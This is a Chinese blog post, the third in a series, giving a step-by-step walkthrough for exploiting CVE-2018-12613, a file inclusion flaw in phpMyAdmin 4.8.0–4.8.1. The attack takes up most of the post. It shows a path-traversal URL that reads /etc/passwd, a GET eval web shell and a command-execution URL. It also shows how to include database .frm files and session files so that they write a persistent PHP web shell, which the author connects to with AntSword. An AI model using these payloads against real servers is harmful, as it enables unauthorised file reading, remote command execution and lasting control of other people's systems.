# CVE-2018-12613 phpmyadmin 文件包含 getshell 连载(三) - PANDA 墨森 - 博客园

> 原文：[`www.cnblogs.com/PANDA-Mosen/p/13164349.html`](https://www.cnblogs.com/PANDA-Mosen/p/13164349.html)

**这是 phpmyadmin 系列渗透思路的第三篇文章，前面一篇文章阐述了通过慢查询日志 getshell，本文将通过文件包含漏洞展开讨论****#001 影响版本**Phpmyadmin 4.8.0/4.8.0.1/4.8.1**#002 漏洞验证利用**

```
http://www.xxx.com/index.php?target=db_sql.php%253f/../../../../../../etc/passwd
```

![](img/b8918cbbe571bf1e9de10476c5308458.png)成功读取到/etc/passwd 文件**#003 利用此漏洞 getshell****思路 1：把 WebShell 写入到数据库中然后包含数据库文件 getshell，如果把 WebShell 当做数据表的字段值是可以完美的写入到数据库文件当中的**![](img/f24a78aa523d41c109f540bbe349e617.png)创建完成结果如下![](img/75395e2073af062f066f796e79cedb3f.png)**2、然后我们需要找到数据库表的文件**

```
show variables like 'datadir' 或
SELECT @@datadir
```

![](img/91c17f80d6001df08152600bc48bcccf.png)**文件的路径就是：data 路径+数据库名/表名.frm**然后包含它就可以，成功包含执行 phpifo

```
index.php?target=db_sql.php%253f/../../../../../../phpStudy/PHPTutorial/MySQL/data/test/test1.frm
```

![](img/f6841d8593e697ff9204fcf7dcd85341.png)**二、命令执行(注意一句话为 GET)**插入：<?php eval($_GET[a]);?>这个字段，然后构造 payload：成功执行命令

```
index.php?a=system("ipconfig");&target=db_sql.php%253f/../../../../../../phpStudy/PHPTutorial/MySQL/data/test/test2.frm
```

![](img/bf1ff91974bc0958372bd7ac0d6f9bd8.png)**三、进行 getshell*****ONE：插入数据表 getshell*****思考过程：**以上所说的都是执行的 phpinfo，以及 get 方式执行了命令，无法用蚁剑等工具直接连接 shell，所以就想利用文件包含直接生成一个 webshell，所以有了以下想法**1、我们插入字段的时候，插入这样一句话，包含之后会在当前目录生成一个 a.php 的 webshell**

```
<?php fputs(fopen("a.php","w"),'<?php eval($_POST[a]);?>');?>
```

![](img/5193c50411f380103abb10b889e0293a.png)可以看到，执行成功![](img/fd9e93fcbddb8881e7156045119119dc.png)**2、接着上面的，包含 test1.frm 文件，包含完成，没有任何报错**![](img/978ba87d7dc6b36580e9d89d6ed0c087.png)**3、接着去看一下是否真的能生成一句话在当前目录，可以看到的确生成了，并且时间是刚刚**![](img/5f5a80df248a6d3bcd8359e84b2d4886.png)**4、然后直接利用蚁剑连接，ok 思路可行，getshell 成功**![](img/50e9e0bdbe62c79f11acf8f625260d65.png)执行一下命令试试，完全没问题，本次探索很成功！![](img/8783bc7c100e2e7852062bcb267a4aab.png)***Two：利用 session 文件 getshell***phpmyadmin 是默认会把执行的语句，记录在 session 文件当中的，所以可以包含 session 文件进行 getshell**1、首先利用上面得到的 phpinfo，查看 session 文件存放的路径，搜索：save_path，看到是在 tmp/tmp 目录下**![](img/a22735488a1994bb193265a4773c486f.png)**2、执行 sql 语句，语句为生成一句话木马的语句**

```
SELECT `<?php fputs(fopen("a.php","w"),'<?php eval($_POST[a]);?>');?>`;    #注意为反引号
```

![](img/7ebd4b5b729cab837de88c5a411c58d0.png)**3、session 可以在 cookie 中找到，例如 google 的，或者 burp 抓包都行**![](img/75ec4e0a4cd0bb36b6e192d954bdfb37.png)**4、然后利用漏洞直接包含 session 文件，文件名：sess_ 你的 session**

```
index.php?target=db_sql.php%253f/../../../../../../phpStudy/PHPTutorial/tmp/tmp/sess_a5gbrbj1rr01lpqpi6mkecc1ti1ar692
```

![](img/2b3899172bd192dee95ca79f90cf8b08.png)**5、然后看当前目录是否生成一句话木马，可以看到又成功生成了，时间是刚刚的**![](img/86d0dbcfac64e49b416690bbf185e8fb.png)**6、利用蚁剑连接：成功！**![](img/72f3ea1bed89f1c054c128819b5920d6.png)这篇文章个人感觉还是可以拓展大家一些思路的，希望大家都能学到一点技巧。